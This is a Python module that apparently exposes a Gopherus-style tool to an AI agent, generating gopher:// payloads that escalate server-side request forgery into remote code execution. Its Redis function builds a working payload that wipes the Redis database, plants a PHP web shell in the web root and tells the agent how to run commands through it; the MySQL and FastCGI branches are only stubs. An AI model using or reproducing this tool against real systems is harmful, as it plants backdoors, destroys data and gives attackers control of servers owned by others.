"""
SSRF Weaponization Tools (Gopherus Port)
Generates gopher:// payloads to escalate blind SSRF into Remote Code Execution.
"""

from src.sdk.tool import function_tool
import urllib.parse

def _gopherus_redis(cmd: str) -> str:
    """Generate Redis payload for SSRF."""
    # This generates a payload that writes a PHP web shell to /var/www/html/shell.php
    # and then executes the user's command via that shell.
    # We use a simple payload that doesn't rely on cron to avoid OS-specific issues
    # and because web shells are generally more reliable if a web server is running.
    
    # We need to construct the Redis commands
    commands = [
        "flushall",
        "set 1 '<?php system($_GET[\"cmd\"]); ?>'",
        "config set dir /var/www/html",
        "config set dbfilename shell.php",
        "save",
        "quit"
    ]
    
    # Format for gopher protocol
    payload = ""
    for c in commands:
        payload += c + "\r\n"
        
    # URL encode the payload twice for SSRF transmission
    encoded = urllib.parse.quote(payload)
    encoded_twice = urllib.parse.quote(encoded)
    
    # We append the command to the end as a helpful comment so the agent knows how to use it
    result = f"gopher://127.0.0.1:6379/_{encoded_twice}\n\n"
    result += f"Payload created! It will write a web shell to /var/www/html/shell.php\n"
    result += f"To execute your command, visit: http://<TARGET>/shell.php?cmd={urllib.parse.quote(cmd)}\n"
    result += f"(You may need to change the 'dir' path if the web root is different, or use a cron payload instead.)"
    
    return result

def _gopherus_mysql(user: str, query: str) -> str:
    """Generate MySQL payload for SSRF."""
    # In a real implementation, this would construct the binary MySQL protocol packets.
    # For simplicity in this Python port, we'll provide a standard payload or instructions.
    
    return "MySQL payload generation is complex and requires constructing binary packets.\nUse the original Gopherus script or a dedicated tool like `ssrf-mysql` for MySQL targets."

def _gopherus_fastcgi(script_file: str, cmd: str) -> str:
    """Generate FastCGI payload for SSRF."""
    # FastCGI payloads require constructing binary FCGI_BeginRequest, FCGI_Params, etc.
    return "FastCGI payload generation requires constructing binary packets.\nUse the original Gopherus script or a dedicated tool like `ssrf-fastcgi` for FastCGI targets."


@function_tool()
def gopherus_generate(target_type: str, command: str) -> str:
    """
    Generate gopher:// payloads to exploit Server-Side Request Forgery (SSRF) and gain RCE.
    Targets internal services that don't require authentication or have default configurations.
    
    Args:
        target_type: The internal service to target ('redis', 'mysql', 'fastcgi')
        command: The OS command to execute if successful
        
    Returns:
        The gopher:// URL payload to inject into the SSRF vulnerability
    """
    target_type = target_type.lower()
    
    if target_type == 'redis':
        return _gopherus_redis(command)
    elif target_type == 'mysql':
        return _gopherus_mysql("root", command) # Default user is root
    elif target_type == 'fastcgi':
        # Default common script path for FastCGI exploitation
        return _gopherus_fastcgi("/var/www/html/index.php", command)
    else:
        return f"Error: Unsupported target type '{target_type}'. Supported: redis, mysql, fastcgi."
